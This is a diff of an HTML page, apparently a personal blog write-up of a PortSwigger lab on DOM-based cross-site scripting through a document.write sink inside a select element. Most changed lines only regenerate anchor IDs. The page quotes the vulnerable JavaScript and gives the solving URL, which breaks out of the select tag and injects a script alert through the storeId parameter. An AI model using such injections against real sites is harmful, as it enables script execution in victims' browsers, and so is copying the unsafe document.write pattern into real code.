@@ -20,25 +20,25 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org20795ec">Introduction</a></li>
-<li><a href="#org2760ba6">Challenge</a></li>
-<li><a href="#org5a8c8b4">Summary</a></li>
+<li><a href="#orgd29df1c">Introduction</a></li>
+<li><a href="#org8d1ccb8">Challenge</a></li>
+<li><a href="#orgdcebd24">Summary</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org20795ec" class="outline-2">
-<h2 id="org20795ec"><a href="#org20795ec">Introduction</a></h2>
-<div class="outline-text-2" id="text-org20795ec">
+<div id="outline-container-orgd29df1c" class="outline-2">
+<h2 id="orgd29df1c"><a href="#orgd29df1c">Introduction</a></h2>
+<div class="outline-text-2" id="text-orgd29df1c">
 <p>
 Not much to say here, just glad to have found some time for challenges ;P
 </p>
 </div>
 </div>
 
-<div id="outline-container-org2760ba6" class="outline-2">
-<h2 id="org2760ba6"><a href="#org2760ba6">Challenge</a></h2>
-<div class="outline-text-2" id="text-org2760ba6">
+<div id="outline-container-org8d1ccb8" class="outline-2">
+<h2 id="org8d1ccb8"><a href="#org8d1ccb8">Challenge</a></h2>
+<div class="outline-text-2" id="text-org8d1ccb8">
 <p>
 You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">here</a>
 </p>
@@ -55,7 +55,7 @@ after previewing the source code, is handled by the following
 javascript snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-javascript" id="org6a0bec2">var stores = ["London","Paris","Milan"];
+<pre class="src src-javascript" id="org94e6bf5">var stores = ["London","Paris","Milan"];
 var store = (new URLSearchParams(window.location.search)).get('storeId');
 document.write('&lt;select name="storeId"&gt;');
 if(store) {
@@ -74,14 +74,14 @@ document.write('&lt;/select&gt;');
 <p>
 In our request we can see that, the variables can be modified:
 </p>
-<pre class="example" id="org9160018">
+<pre class="example" id="org7ddc550">
 productId=1&amp;storeId=London
 </pre>
 
 <p>
 Sample link that gives us the desired output in console:
 </p>
-<pre class="example" id="orge7daa6e">
+<pre class="example" id="org212a23b">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=asdfasdf
 </pre>
 
@@ -89,16 +89,16 @@ https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?produc
 After that it was tedious: We just had to get out of the existing
 environments and add a script one:
 </p>
-<pre class="example" id="org88e16e8">
+<pre class="example" id="orgae6f1a1">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 </pre>
 </div>
 </div>
 
 
-<div id="outline-container-org5a8c8b4" class="outline-2">
-<h2 id="org5a8c8b4"><a href="#org5a8c8b4">Summary</a></h2>
-<div class="outline-text-2" id="text-org5a8c8b4">
+<div id="outline-container-orgdcebd24" class="outline-2">
+<h2 id="orgdcebd24"><a href="#orgdcebd24">Summary</a></h2>
+<div class="outline-text-2" id="text-orgdcebd24">
 <p>
 This was the first challenge I completed for the day, and I think it
 was the perfect way to start it: not too easy, but at the same time
